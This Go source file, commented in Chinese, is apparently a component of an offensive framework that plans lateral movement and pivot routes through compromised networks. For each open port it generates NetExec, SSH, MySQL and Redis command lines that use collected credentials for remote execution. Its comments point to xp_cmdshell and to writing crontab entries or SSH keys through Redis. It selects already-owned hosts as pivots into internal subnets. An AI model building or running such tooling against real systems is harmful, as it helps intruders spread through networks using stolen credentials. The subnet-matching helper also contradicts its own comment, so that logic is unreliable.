// Package lateral 是「横向与路由」规划器：给定立足点与目标，
// 给出可执行的横移方式和可达路由（不含实际连接），供 worker 执行、台账记账。
package lateral

import (
	"fmt"
	"sort"
	"strings"
)

// Host 是一个横移目标/跳板。
type Host struct {
	Addr     string `json:"addr"` // ip 或 host
	OS       string `json:"os,omitempty"`
	Ports    []int  `json:"ports,omitempty"`
	CredRef  int64  `json:"cred_ref,omitempty"`
	HasShell bool   `json:"has_shell"`
	Depth    int    `json:"depth"` // 0=直接可达，1=经一跳...
}

// Plan 是一条横移方案。
type Plan struct {
	Proto   string `json:"proto"` // ssh|smb|winrm|mssql|mysql|redis|rdp
	Target  string `json:"target"`
	Command string `json:"command"`
	Why     string `json:"why"`
	Risk    string `json:"risk"`
	Score   int    `json:"score"`
}

// Plans 根据开放端口给出横移方案（按可用性排序）。
func Plans(h Host) []Plan {
	open := map[int]bool{}
	for _, p := range h.Ports {
		open[p] = true
	}
	has := func(p int) bool { return len(open) == 0 || open[p] }

	var out []Plan
	add := func(p Plan) { out = append(out, p) }

	if has(22) {
		add(Plan{Proto: "ssh", Target: h.Addr,
			Command: fmt.Sprintf("ssh -o StrictHostKeyChecking=no ${USER}@%s", h.Addr),
			Why:     "22 开放：用已收凭据/私钥直接登录（最稳）", Risk: "low", Score: 95})
	}
	if has(445) {
		add(Plan{Proto: "smb", Target: h.Addr,
			Command: fmt.Sprintf("nxc smb %s -u ${USER} -p ${SECRET} -x 'whoami'", h.Addr),
			Why:     "445 开放：SMB 认证后可远程执行（需管理员权限）", Risk: "medium", Score: 88})
	}
	if has(5985) || has(5986) {
		add(Plan{Proto: "winrm", Target: h.Addr,
			Command: fmt.Sprintf("nxc winrm %s -u ${USER} -p ${SECRET} -x whoami", h.Addr),
			Why:     "WinRM 开放：Windows 远程执行", Risk: "medium", Score: 90})
	}
	if has(1433) {
		add(Plan{Proto: "mssql", Target: h.Addr,
			Command: fmt.Sprintf("nxc mssql %s -u ${USER} -p ${SECRET} -q 'SELECT @@version'", h.Addr),
			Why:     "1433 开放：SQL Server 认证后可 xp_cmdshell", Risk: "medium", Score: 80})
	}
	if has(3306) {
		add(Plan{Proto: "mysql", Target: h.Addr,
			Command: fmt.Sprintf("mysql -h %s -u '${USER}' -p'${SECRET}' -e 'SELECT VERSION()'", h.Addr),
			Why:     "3306 开放：数据库横向（可读数据/写文件）", Risk: "medium", Score: 75})
	}
	if has(6379) {
		add(Plan{Proto: "redis", Target: h.Addr,
			Command: fmt.Sprintf("redis-cli -h %s -a '${SECRET}' INFO", h.Addr),
			Why:     "6379 开放：弱口令/未授权可写 crontab 或 SSH key", Risk: "medium", Score: 78})
	}
	if has(3389) {
		add(Plan{Proto: "rdp", Target: h.Addr,
			Command: fmt.Sprintf("nxc rdp %s -u ${USER} -p ${SECRET}", h.Addr),
			Why:     "3389 开放：RDP 认证可交互登录", Risk: "medium", Score: 70})
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Score > out[j].Score })
	return out
}

// Pivot 是一个可用跳板（已拥有的主机）。
type Pivot struct {
	OwnedID int64    `json:"owned_id"`
	Host    string   `json:"host"`
	CIDRs   []string `json:"cidrs"` // 该主机能访问到的内网段
	Proxy   string   `json:"proxy,omitempty"`
}

// Route 是一条可达路由（对应 routes 表）。
type Route struct {
	CIDR   string `json:"cidr"`
	Via    string `json:"via"` // 跳板 host（空 = 直连出口）
	Proxy  string `json:"proxy,omitempty"`
	Hops   int    `json:"hops"`
	Score  int    `json:"score"`
	Reason string `json:"reason,omitempty"`
}

// PlanRoutes 为每个目标网段选择最优跳板：跳数最少 → 跳板最靠前。
func PlanRoutes(targets []string, pivots []Pivot) []Route {
	var out []Route
	for _, t := range targets {
		t = strings.TrimSpace(t)
		if t == "" {
			continue
		}
		best := Route{CIDR: t, Hops: 99, Reason: "无跳板可达（需要先拿立足点）"}
		for i, p := range pivots {
			for _, c := range p.CIDRs {
				if c == "" || !overlaps(t, c) {
					continue
				}
				hops := i + 1
				if hops < best.Hops {
					best = Route{CIDR: t, Via: p.Host, Proxy: p.Proxy, Hops: hops,
						Score: 100 - hops*10, Reason: "经跳板 " + p.Host + " 可达 " + c}
				}
			}
		}
		if best.Hops == 99 {
			best.Hops = 0
			best.Score = 0
		}
		out = append(out, best)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Score > out[j].Score })
	return out
}

// overlaps 做最小的 "10.0.0.0/24 vs 10.0.0.5" / 同段判断（不做完整 CIDR 计算）。
func overlaps(target, known string) bool {
	if target == known {
		return true
	}
	// 目标里带 / 时比较前缀；否则比较前三段。
	if !strings.Contains(target, "/") && !strings.Contains(known, "/") {
		return false
	}
	a := strings.Split(strings.Split(target, "/")[0], ".")
	b := strings.Split(strings.Split(known, "/")[0], ".")
	if len(a) < 3 || len(b) < 3 {
		return false
	}
	n := 3
	if strings.HasSuffix(target, "/24") || strings.HasSuffix(known, "/24") {
		n = 3
	}
	if strings.HasSuffix(target, "/16") || strings.HasSuffix(known, "/16") {
		n = 2
	}
	if strings.HasSuffix(target, "/8") || strings.HasSuffix(known, "/8") {
		n = 1
	}
	for i := 0; i < n; i++ {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
